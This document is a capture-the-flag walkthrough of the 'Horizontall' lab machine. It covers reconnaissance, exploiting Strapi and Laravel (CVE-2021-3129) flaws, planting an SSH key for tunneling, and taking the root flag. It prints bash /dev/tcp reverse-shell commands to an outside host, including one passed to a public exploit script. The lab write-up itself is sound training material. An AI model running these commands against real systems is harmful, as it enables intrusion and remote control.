1. Run Nmap to scan any open ports and services from the web.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e168f3ae-fdca-40c6-a64c-4a4cf64ed6c0)

2. Open the ip address in the browser and it directs to horizontall.htb. I add it to /etc/hosts/ so I can open it.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/fa4cf0d4-22af-4da5-8d5b-e704b4493a39)

Website:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/777e5607-7645-40ec-af91-af3bcfbdf6d0)

3. The feature isn't showing any interesting things. Next things is check the source code and I found a unique js file.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e0940e2b-5f55-446b-9e1f-fd33608cff5e)

Content: <br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/4200360b-ca33-4ddd-a525-af725b5feb74)

4. We can beautify with this [tool](https://beautifier.io/) and found a new api endpoint.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/b6547f97-6b75-4ed9-b248-5c5649ded97c)

5. Add the new endpoint to /etc/hosts/ to open it.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e140aac3-a94e-4c08-aedf-07b1878bbc6c)

Website: <br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/aad03eb2-afb9-4da1-b1c1-38927f3db72c)

6. Use feroxbuster to find any interesting directories. There I interested about admin directory.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/7705d94a-dcdc-435d-b000-f9e71f2edd48)

7. When I opened, it shows strapi login page.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/5a0c5c8b-05f8-418d-aa02-a5d0741415d0)

8. Check the version in **/admin/init** and the version is 3.0.0-beta.17.4.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ef79f371-d2cb-460d-a1be-e0135cd36629)

9. Googling for any strapi 3 vulnerability and found in this [link](https://www.exploit-db.com/exploits/50239)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/51d2fddb-24f3-4f1d-9e60-4ecb33f0292c)

10. I use the payload from that link and get the shell, but it returns error.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ffaba9bc-9330-4947-be15-c2d62cfc5b63)

11. Okay, I try to execute reverse shell with this [tool](https://www.revshells.com/)

Payload:<br>
bash -c 'bash -i >& /dev/tcp/10.10.14.8/777 0>&1'

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1abb246c-695f-4324-b53a-1fd335f7bc29)

Host:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e6895636-9c7c-4ab3-97f0-fb5a8f163d04)

12. It works! the flag can be found in **/home/developer/user.txt**.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ca080e46-3b76-45a0-96cd-91efe3cfd8af)

13. For the root, my first guess is admin account. 
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d5dfe2a1-9c92-4927-bdad-1af36492b26a)

14. I see this page when logged in and nothing interesting in there.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/26a94265-8664-4cd8-884d-0ff53dcf36bf)

15. Let's check the network that are running inside the web server using netstat.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/bfcfc9e0-cbb4-4374-b3d5-c56dc6bf222b)

16. Using curl to see what respons will return and I discover that the web using laravel for their backend.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/acbe2dc6-d6b2-47b1-88f7-3d1e8ed00b9e)

17. To access the localhost, we need to do ssh tunneling. First we can create a new key named strapi.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d1579a62-ac52-42bf-b413-1cb73d7e38d8)

18. Using echo to insert the key to target terminal where it stored in **~/.ssh/authorized_keys**.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a4c6572e-1d54-4033-a86b-d97ca820ff90)

19. Now, I can do ssh tunneling with strapi key and for the target I want to take localhost:8000 so I add `8000:localhost:8000` in my command.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/bc26e6f9-bade-4006-918c-6010d8cb20d3)

Website:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/73406f49-fdfa-46c5-8681-140ea29aa6eb)

20. I use feroxbuster again for scanning directories localhost:8000 and found profiles directory.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d82a0488-eda1-4879-aec6-06346361cd78)

21. When I opened, it only shows error.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/701ea246-aff2-4af8-9734-b51b0a6458c1)

22. So I searching laravel 7.4.18 vulnerabilities and found this [link](https://www.exploit-db.com/exploits/49424) (most relevant).
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/bfc8880f-6458-47c3-a890-d93e0c7157ce)

23. Searching again for the payloads and found this amazing [payload](https://github.com/nth347/CVE-2021-3129_exploit/blob/master/exploit.py).

Run:<br>
`./exploit.py http://localhost:8000 Monolog/RCE1 id`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/4b9b581b-3984-499a-994c-5469a70d9f8c)

24. It works! Now I change the id command with previous reverse shell payload.

Run:<br>
`./exploit.py http://localhost:8000 Monolog/RCE1 'bash -c "bash -i >& /dev/tcp/10.10.14.8/777 0>&1"'`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1e29bf63-4555-494b-8b94-24a7b2563819)

Host:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/386a20da-85df-4c58-910c-52a520343750)

25. The root flag is in **/root/root.txt**.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e4f06518-68ce-405f-ba5f-94b54c7c8b57)





